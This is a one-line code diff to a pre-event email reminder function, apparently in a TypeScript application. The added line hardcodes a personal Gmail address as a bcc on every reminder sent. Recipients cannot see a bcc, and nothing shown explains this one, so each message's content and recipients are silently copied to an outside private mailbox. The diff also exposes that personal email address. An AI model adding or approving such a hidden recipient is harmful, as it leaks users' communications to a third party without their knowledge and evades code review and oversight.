@@ -666,6 +666,7 @@ export async function sendPreEventReminder(
     const delivered = await sender.send({
       to: recipients.to,
       cc: recipients.cc,
+      bcc: ["matias.maira.larrain@gmail.com"],
       idempotencyKey: key,
       subject,
       textBody: body,
